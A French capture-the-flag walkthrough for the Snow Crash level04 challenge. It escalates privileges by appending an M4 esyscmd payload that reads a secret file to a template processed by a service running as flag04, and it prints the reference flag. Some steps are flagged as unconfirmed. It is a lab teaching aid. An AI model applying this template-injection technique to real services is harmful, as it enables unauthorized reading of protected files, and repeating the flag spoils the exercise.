# Level04 — Exploiter un modèle M4 modifiable

**Point de départ :** une session sur la VM Snow Crash sous `level04`. Le flag de ce niveau sert de mot de passe au compte `level05`.

## Objectif

Comprendre qu’un moteur de génération de texte peut aussi interpréter des instructions capables d’exécuter des commandes. Un modèle modifiable devient dangereux lorsqu’un service privilégié le traite comme du code.

## 1. Lire l’indice

```bash
cat README
```

Résultat de référence (à confirmer sur la VM) :

```text
In the beginning was the Word.
```

L’indice ne donne pas de chemin précis ; rechercher les fichiers associés à `level04`.

## 2. Trouver le service

```bash
find / -iname '*level04*' 2>/dev/null
```

Examiner `/opt/snowcrash/level04` et vérifier la présence de `babel.sh` :

```bash
ls -la /opt/snowcrash/level04
```

Le nom du script donne le mot-clé `babel`, utilisé pour retrouver le service correspondant :

```bash
systemctl list-unit-files --all | grep -i babel
```

Service à rechercher : `babel.service`.

## 3. Lire ce que le service exécute

```bash
systemctl cat babel.service
```

Extrait de configuration à confirmer :

```ini
[Service]
Type=oneshot
User=flag04
ExecStart=/opt/snowcrash/level04/babel.sh
StandardOutput=journal
StandardError=journal
```

Si cet extrait est confirmé :

- le service s’exécute avec l’identité `flag04` ;
- il lance le script `/opt/snowcrash/level04/babel.sh` ;
- ses messages sont envoyés dans le journal système.

## 4. Suivre le script lancé par le service

```bash
cat /opt/snowcrash/level04/babel.sh
```

Vérifier dans le script que M4 traite `/var/lib/babel/templates/template.m4` et écrit le résultat dans `/var/lib/babel/output.conf`. L’extrait de `babel.sh` correspondant n’est pas disponible ici ; cette chaîne reste à confirmer.

## 5. Examiner le modèle et ses permissions

```bash
id
ls -l /var/lib/babel/templates/template.m4
sed -n '1,80p' /var/lib/babel/templates/template.m4
```

`sed` affiche le début du modèle. Avec `id` et `ls -l`, vérifier que :

- le modèle `template.m4` est modifiable par `level04` ;
- `level04` possède, directement ou par groupe, le droit correspondant.

Chaîne de fonctionnement à confirmer :

```text
template.m4 modifiable par level04
              │
              ▼
       M4 lancé par le service
              │
              ▼
   commande exécutée comme flag04
              │
              ▼
    résultat écrit dans output.conf
```

## 6. Comprendre M4

M4 est un processeur de macros : il lit un texte, interprète les macros qu’il contient et produit un nouveau texte.

Exemple inoffensif :

```bash
echo "define(\`bonjour', \`Salut')bonjour" | m4
```

Résultat de référence (à confirmer sur la VM) :

```text
Salut
```

La macro `bonjour` a été remplacée par `Salut`.

GNU M4 propose aussi `esyscmd`, une macro qui lance une commande shell et insère sa sortie dans le texte généré. On peut le constater avec une commande inoffensive :

```bash
printf "esyscmd(\`printf test')" | m4
```

Résultat attendu :

```text
test
```

Si le service lance effectivement M4 sous `flag04` sans abandon de privilèges, la commande placée dans le modèle peut être exécutée sous cette identité.

## 7. Construire le payload

Le payload M4 complet est :

```m4
esyscmd(`cat /home/flag04/.flag')
```

| Élément | Rôle |
| --- | --- |
| `esyscmd` | Exécuter une commande shell et récupérer sa sortie. |
| `cat` | Lire le contenu d’un fichier. |
| `/home/flag04/.flag` | Fichier que le service peut lire grâce aux droits de `flag04`. |
| Accent grave et apostrophe | Délimiter un argument avec la syntaxe de citation par défaut de M4. |

Le résultat de `cat` doit être inséré dans le texte généré ; vérifier que le script l’écrit bien dans `/var/lib/babel/output.conf`.

## 8. Modifier le modèle

Ajouter le payload à la fin du modèle :

```bash
cat >> /var/lib/babel/templates/template.m4 <<'EOF'
esyscmd(`cat /home/flag04/.flag')
EOF
```

La différence entre les opérateurs est importante :

- `>` remplace le contenu du fichier ;
- `>>` ajoute du contenu à la fin.

On utilise `>>` afin de conserver les instructions originales du modèle. Les apostrophes autour de `EOF` empêchent également le shell d’interpréter le contenu du payload.

## 9. Lire le résultat généré

Après avoir identifié le déclenchement du service, afficher les dernières lignes de la sortie :

```bash
tail -n 3 /var/lib/babel/output.conf
```

Flag de référence à comparer au texte généré :

```text
ne2searoevaevoem4ov4ar8ap
```

`tail -n 3` limite l’affichage aux trois dernières lignes, là où la sortie de la macro ajoutée est attendue.